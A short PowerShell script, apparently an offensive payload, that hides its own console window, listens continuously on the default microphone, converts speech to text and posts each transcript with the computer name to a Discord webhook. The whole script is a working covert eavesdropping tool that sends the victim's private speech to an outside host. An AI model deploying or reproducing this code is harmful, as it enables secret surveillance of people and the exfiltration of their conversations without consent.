<#=============================== Speech to Discord ====================================

SYNOPSIS
Uses assembly 'System.Speech' to take audio input and convert to text and then send the text to discord.

SETUP
1. Replace 'YOUR_WEBHOOK_HERE' with your discord webhook

#>

$dc = "$dc"
if ($dc.Length -lt 120){
	$dc = ("https://discord.com/api/webhooks/" + "$dc")
}


# Uncomment $hide='y' below to hide the console

# $hide='y'
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w,0)
    }else{
        $Host.UI.RawUI.WindowTitle = 'xx'
        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
        $w=$p.MainWindowHandle
        $t::ShowWindowAsync($w,0)
    }
}

Add-Type -AssemblyName System.Speech
$speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
$grammar = New-Object System.Speech.Recognition.DictationGrammar
$speech.LoadGrammar($grammar)
$speech.SetInputToDefaultAudioDevice()

while ($true) {
    $result = $speech.Recognize()
    if ($result) {
        $results = $result.Text
        Write-Output $results
        if ($dc.Ln -ne 121){$dc = (irm $dc).url}
        $Body = @{'username' = $env:COMPUTERNAME ; 'content' = $results}
        irm -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
    }
}
